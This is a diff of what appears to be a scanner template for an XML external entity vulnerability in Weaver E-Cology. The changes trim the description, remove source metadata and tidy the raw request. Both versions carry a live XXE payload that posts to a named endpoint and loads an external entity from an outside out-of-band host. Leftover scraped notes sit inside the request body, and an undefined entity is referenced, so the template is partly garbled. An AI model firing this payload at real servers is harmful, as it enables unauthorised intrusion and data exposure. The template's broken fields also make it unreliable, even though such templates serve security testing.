@@ -3,17 +3,11 @@ info:
   name: 泛微E-Cology Xml外部实体注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hbk67uiotdhu85ig
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hbk67uiotdhu85ig
-    fofa: 暂无
 http:
 - raw:
-  - "POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1\n\nContent-Type: application/xml\n\nAccept-Encoding: gzip\n\n\n\n\n\n<?xml version=\"1.0\"?>\n\n<!DOCTYPE ANY [\n\n    <!ENTITY % d SYSTEM \"http://wutvavcfzj.dnstunnel.run\">\n\n    %d;\n\n]>\n\n<a>&xxe;</a>\n\n# 响应代码特征\n-1\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
+  - "POST /rest/ofs/deleteUserRequestInfoByXml HTTP/1.1\n\nContent-Type: application/xml\n\nAccept-Encoding: gzip\n\n<?xml version=\"1.0\"?>\n\n<!DOCTYPE ANY [\n\n    <!ENTITY % d SYSTEM \"http://wutvavcfzj.dnstunnel.run\">\n\n    %d;\n\n]>\n\n<a>&xxe;</a>\n\n# 响应代码特征\n-1\n\n# 响应内容特征\n暂无\n\n# 上传文件定位\n暂无"
   redirects: false
   matchers:
   - status:
